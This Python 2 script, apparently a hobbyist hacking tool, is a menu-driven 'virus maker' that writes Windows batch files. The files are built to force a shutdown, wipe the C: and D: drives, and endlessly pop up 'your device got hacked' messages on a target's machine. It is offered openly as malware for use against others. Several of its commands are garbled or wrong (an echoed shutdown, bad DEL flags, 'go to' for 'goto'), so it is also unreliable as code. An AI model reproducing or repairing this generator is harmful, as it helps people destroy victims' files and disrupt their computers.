#!/usr/bin/python

############################### TOOLS MAKED BY ANONYMINHACK5
import os
import urllib2
import json
import time
import smtplib
from termcolor import colored, cprint
from base64 import *
############################### RECODE AUTO JAHANNAM

os.system("reset")

print ("\033[93m     __  __                               ")                  
print ("\033[93m    /  |/  /_  ___   __(_)______  _______ ")
print ("\033[93m   / /|_/ / / / / | / / / ___/ / / / ___/ ")
print ("\033[93m  / /  / / /_/ /| |/ / / /  / /_/ (__  )  ")
print ("\033[93m /_/  /_/\__, / |___/_/_/   \__,_/____/   ")
print ("\033[93m        /____/                            ")
print ("\033[93m -----------------------------------------")
print ("\033[34m [+]TOOLS : Virus.bat Maker for OS Windows")
print ("\033[34m [+]Author : AnonyminHack5")
print ("\033[95m [+]Team : Termux Android Hackers - Hackers United - Level IV NOOBS")
print ("\033[34m [+]Twitter : @AnonyminHack5")
print ("\033[34m Found bug? contact my Twitter handle")
print ("\033[93m -----------------------------------------")

def menu():
    print'\33[33m Choose The Selection :'
    print'\33[33m -----------------'
    print'\33[33m [1] Shutdown'
    print'\33[33m [2] Delete all Files Target'
    print'\33[33m [3] Summon Text Permanently'
    print'\33[33m [4] Exit'
    print'\33[33m -----------------'
def shutdown():
    thangans = open ("shutdown.bat","w")
    virus = """
    @echo shutdown -s -t 1 -f 
    """
    thangans.write(virus)
    thangans.close
    print 'Want to Create our Virus? (y/n)'
    back=raw_input().upper()
    if back=='y':
        menu()
    else:
        exit()
def delete():
    thangans = open ("delete.bat","w")
    virus = """
    @echo off
    DEL C: -Y
    DEL D: -Y
    """
    thangans.write(virus)
    thangans.close
    print 'Want to Create our Virus? (y/n)'
    back=raw_input().upper()
    if back=='y':
        menu()
    else:
        exit()
def summon():
    thangans = open ("summon.bat","w")
    virus = """
    @echo off
    :Begin
    msg * Your Device got HACKED BY ANONYMINHACK5
    msg * Your Device was infected by THAN MALWARE
    msg * Re - Install your Device
    go to begin
    """
    thangans.write(virus)
    thangans.close
    print 'Want to Create our Virus? (y/n)'
    back=raw_input().upper()
    if back=='y':
        menu()
    else:
        exit()
menu()
while 1:
    pilih=input('Input Your Selection : ')
    if pilih==1:
        shutdown()
    elif pilih==2:
        delete()
    elif pilih==3:
        summon()
    elif pilih==4 :
        exit()
    else:
        print'kshama karen, aapaka chayan menoo par upalabdh nahin hai'
	print'sorry, your selection not available on menu'
        print'Want to Create our Virus? (y/n)'
    back=raw_input().upper()
    if back=='y':
        menu()
    else:
        exit()